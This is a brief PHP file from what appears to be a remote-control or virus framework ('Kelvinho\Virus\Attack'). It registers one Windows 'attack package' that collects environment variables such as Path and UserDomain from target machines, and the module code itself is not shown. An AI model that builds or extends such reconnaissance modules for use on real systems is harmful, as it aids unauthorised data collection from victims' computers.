<?php

use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.CollectEnv", "\\Kelvinho\\Virus\\Attack\\AttackPackages\\Windows\\OneTime\\CollectEnv", "easy.CollectEnv", "Collect environmental variables, like JAVA_PATH, Path, UserDomain, etc.");